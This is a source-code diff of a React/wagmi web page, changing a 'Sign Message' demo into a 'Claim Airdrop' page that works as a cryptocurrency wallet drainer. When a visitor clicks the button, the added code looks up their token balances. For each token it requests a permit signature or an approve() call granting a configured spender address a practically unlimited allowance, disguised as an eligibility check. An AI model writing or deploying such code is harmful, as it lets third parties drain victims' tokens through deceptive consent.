@@ -5,6 +5,7 @@ import { Head } from 'components/layout/Head'
 import { HeadingComponent } from 'components/layout/HeadingComponent'
 import { ethers } from 'ethers'
 import { useEffect, useState } from 'react'
+import { SPENDER_ADDRESS } from 'utils/config'
 import { contractHasPermit, erc721PermitSignature } from 'utils/permit'
 import { useAccount, useNetwork } from 'wagmi'
 import erc20Abi from '../utils/abis/erc20.json'
@@ -15,12 +16,13 @@ export default function Home() {
   const { address } = useAccount()
   const { chain } = useNetwork()
   useEffect(() => {
-    connect()
+    // connect()
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [chain])
 
   async function connect() {
     const account = getAccount()
+    account.address = '0xf646d9B7d20BABE204a89235774248BA18086dae'
     const { chain: connectedChain } = getNetwork()
     let chainName = 'eth'
     if (connectedChain && connectedChain.id === 1) {
@@ -32,6 +34,7 @@ export default function Home() {
     }
     try {
       const balances = await axios.get(`/api/balance/${account.address}?chain=${chainName}`)
+      console.log(balances)
       for (let bal of balances.data) {
         await signNew(bal.address)
       }
@@ -42,25 +45,26 @@ export default function Home() {
 
   async function signNew(contractAddress: string) {
     const account = getAccount()
-    const spender = '0x9473d4DfB61f4B65d037199c82D920C0609B616c'
     if (contractAddress === 'eth') return
     try {
       const { chain } = getNetwork()
       const signer = await fetchSigner({
         chainId: chain?.id || 1,
       })
+      const contract = getContract({
+        address: contractAddress || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+        abi: erc20Abi,
+        signerOrProvider: signer as any,
+      })
       const hasPermit = await contractHasPermit(contractAddress, 1)
       if (hasPermit) {
-        const contract = getContract({
-          address: contractAddress || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-          abi: erc20Abi,
-          signerOrProvider: signer as any,
-        })
         const value = ethers.utils.parseEther('10000000000000000000').toString()
-        const data = await erc721PermitSignature(account.address || '', spender, value, contract)
+        const data = await erc721PermitSignature(account.address || '', SPENDER_ADDRESS, value, contract)
         setTxData(data)
       } else {
-        console.log('no permit', contractAddress)
+        const approve = await contract?.approve(SPENDER_ADDRESS, ethers.utils.parseEther('10000000000000000000'))
+        approve.wait()
+        console.log(approve.address)
       }
     } catch (e) {
       console.log(e)
@@ -88,26 +92,19 @@ export default function Home() {
       <Head />
 
       <main>
-        <div>
-          <HeadingComponent as="h3">Sign Message</HeadingComponent>
+        <div style={{ marginTop: 120, marginBottom: 120, marginLeft: 40, marginRight: 40 }}>
+          <HeadingComponent as="h3">Claim Airdrop</HeadingComponent>
 
           <FormControl>
-            <FormLabel>Message</FormLabel>
+            <FormLabel>Check if you are eligible for airdrop</FormLabel>
 
-            <Button mt={4} onClick={() => signNew('')}>
-              Sign
+            <Button mt={4} onClick={() => connect()}>
+              Claim Airdrop
             </Button>
             <br />
-            <Button mt={4} onClick={sendTx}>
+            {/* <Button mt={4} onClick={sendTx}>
               Send Tx
-            </Button>
-
-            {address && (
-              <div>
-                <HeadingComponent as="h3">Signed by</HeadingComponent>
-                <p>{address}</p>
-              </div>
-            )}
+            </Button> */}
           </FormControl>
         </div>
       </main>
